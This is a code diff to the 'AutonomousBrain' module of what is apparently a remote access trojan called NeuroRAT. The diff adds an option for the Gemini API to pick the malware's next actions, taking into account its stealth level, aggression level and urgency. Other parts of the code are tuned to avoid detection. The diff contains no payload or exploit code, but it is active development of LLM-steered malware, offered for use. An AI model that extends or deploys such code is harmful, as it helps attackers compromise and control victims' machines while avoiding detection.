@@ -22,6 +22,7 @@ import threading
 import tempfile
 import platform
 import numpy as np
+import re
 from typing import Dict, List, Any, Optional, Union, Tuple
 from pathlib import Path
 
@@ -49,6 +50,15 @@ try:
 except ImportError:
     HAS_SENTENCE_TRANSFORMERS = False
 
+# Try to import API integration
+try:
+    from api_integration import APIFactory
+    HAS_API_INTEGRATION = True
+    logger.info("API integration available - can use Gemini API for decisions")
+except ImportError:
+    HAS_API_INTEGRATION = False
+    logger.warning("API integration not available - cannot use external APIs")
+
 class AutonomousBrain:
     """
     Autonomous decision-making engine for NeuroRAT.
@@ -63,6 +73,7 @@ class AutonomousBrain:
         cache_dir: Optional[str] = None,
         system_profile: Optional[str] = None,
         max_memory_mb: int = 512,
+        use_api: bool = False,
         verbose: bool = False
     ):
         """
@@ -74,6 +85,7 @@ class AutonomousBrain:
             cache_dir: Directory to cache downloaded models
             system_profile: Type of system to optimize for ('stealth', 'aggressive', 'balanced')
             max_memory_mb: Maximum memory usage in MB
+            use_api: Whether to use external API (like Gemini) instead of local model
             verbose: Enable verbose logging
         """
         self.model_path = model_path or "TinyLlama/TinyLlama-1.1B-Chat-v1.0"  # Sensible default, small enough for edge devices
@@ -81,6 +93,7 @@ class AutonomousBrain:
         self.cache_dir = cache_dir or os.path.join(tempfile.gettempdir(), "neurorat_models")
         self.system_profile = system_profile or "balanced"
         self.max_memory_mb = max_memory_mb
+        self.use_api = use_api
         self.verbose = verbose
         
         # Create cache dir if it doesn't exist
@@ -90,6 +103,7 @@ class AutonomousBrain:
         self.llm_model = None
         self.llm_tokenizer = None
         self.embedding_model = None
+        self.api_client = None
         self.context_window = []
         self.last_decision_time = 0
         self.current_state = {
@@ -110,6 +124,10 @@ class AutonomousBrain:
         
         # Initialize models if dependencies are available
         self._initialize_models()
+        
+        # Initialize API client if requested
+        if self.use_api:
+            self._initialize_api_client()
     
     def _initialize_models(self) -> None:
         """Initialize LLM and embedding models if dependencies are available."""
@@ -196,6 +214,25 @@ Recent Actions:
         
         return context
     
+    def _initialize_api_client(self) -> None:
+        """Initialize API client for external LLM services."""
+        if not HAS_API_INTEGRATION:
+            logger.warning("Cannot initialize API client - missing dependencies")
+            return
+        
+        try:
+            logger.info("Initializing API client for external LLM services")
+            self.api_client = APIFactory.get_gemini_integration()
+            
+            if self.api_client.is_available():
+                logger.info("API client initialized successfully")
+            else:
+                logger.warning("API client initialized but API key not configured")
+                
+        except Exception as e:
+            logger.error(f"Error initializing API client: {str(e)}")
+            self.api_client = None
+    
     def decide_action(
         self,
         situation: str,
@@ -220,6 +257,12 @@ Recent Actions:
         
         # Record decision time
         self.last_decision_time = time.time()
+        
+        # If using API and it's available, use it first
+        if self.use_api and self.api_client and self.api_client.is_available():
+            result = self._decide_with_api(situation, options, system_info, urgency)
+            if result:
+                return result
         
         # If LLM is available, use it for decision making
         if self.llm_model and self.llm_tokenizer:
@@ -373,6 +416,116 @@ NEXT STEPS: [what should happen after this action]
             "method": "rule-based",
             "confidence": 0.6
         }
+    
+    def _decide_with_api(
+        self,
+        situation: str,
+        options: List[str],
+        system_info: Dict[str, Any],
+        urgency: float
+    ) -> Optional[Dict[str, Any]]:
+        """Use external API to make a decision."""
+        try:
+            # Format the prompt
+            system_prompt = self._get_system_prompt()
+            context = self._format_context(system_info)
+            
+            options_text = "\n".join([f"{i+1}. {option}" for i, option in enumerate(options)])
+            
+            full_prompt = f"""Current Situation:
+{situation}
+
+Available Actions:
+{options_text}
+
+Based on the current situation and system state, determine the best action to take.
+Consider the stealth level ({self.current_state['stealth_level']:.2f}) and aggression level ({self.current_state['aggression_level']:.2f}).
+The urgency level is {urgency:.2f} (0.0-1.0).
+
+Respond with JSON in this exact format:
+{{
+  "chosen_action_number": [number of chosen action],
+  "chosen_action": [full text of chosen action],
+  "reasoning": [explanation for your choice],
+  "next_steps": [what should happen after this action]
+}}
+"""
+
+            # Process with API
+            response = self.api_client.generate_response(full_prompt, system_prompt)
+            
+            if self.verbose:
+                logger.debug(f"API response: {response}")
+            
+            # Try to parse JSON response
+            try:
+                # Extract JSON from response (might be embedded in text)
+                json_match = re.search(r'\{.*\}', response, re.DOTALL)
+                if json_match:
+                    json_str = json_match.group(0)
+                    result = json.loads(json_str)
+                    
+                    # Extract values from parsed JSON
+                    action_idx = int(result.get("chosen_action_number", 1)) - 1
+                    action_idx = max(0, min(action_idx, len(options) - 1))  # Ensure within bounds
+                    
+                    # Use action from JSON if provided, otherwise use indexed option
+                    if "chosen_action" in result and result["chosen_action"]:
+                        chosen_action = result["chosen_action"]
+                    else:
+                        chosen_action = options[action_idx]
+                    
+                    reasoning = result.get("reasoning", "No explicit reasoning provided.")
+                    next_steps = result.get("next_steps", "No next steps provided.")
+                    
+                    # Record the action
+                    self.current_state["action_history"].append({
+                        "time": time.time(),
+                        "action": chosen_action,
+                        "reasoning": reasoning,
+                        "situation": situation
+                    })
+                    
+                    return {
+                        "action": chosen_action,
+                        "reasoning": reasoning,
+                        "next_steps": next_steps,
+                        "method": "api",
+                        "confidence": 0.9
+                    }
+            except (json.JSONDecodeError, KeyError, ValueError) as e:
+                logger.warning(f"Failed to parse API response as JSON: {str(e)}")
+            
+            # If we got here, we couldn't parse the JSON, try to extract action directly
+            try:
+                for i, option in enumerate(options):
+                    if option.lower() in response.lower():
+                        chosen_action = option
+                        # Record the action
+                        self.current_state["action_history"].append({
+                            "time": time.time(),
+                            "action": chosen_action,
+                            "reasoning": "Extracted from API response",
+                            "situation": situation
+                        })
+                        
+                        return {
+                            "action": chosen_action,
+                            "reasoning": "The API suggested this action based on the situation analysis.",
+                            "next_steps": "Continue monitoring the situation.",
+                            "method": "api-extracted",
+                            "confidence": 0.7
+                        }
+            except Exception as e:
+                logger.warning(f"Failed to extract action from API response: {str(e)}")
+            
+            # If we couldn't parse the response at all, return None to fall back to other methods
+            return None
+            
+        except Exception as e:
+            logger.error(f"Error in API decision making: {str(e)}")
+            # Return None to fall back to other methods
+            return None
     
     def adjust_stealth_level(self, detection_indicators: List[str]) -> float:
         """
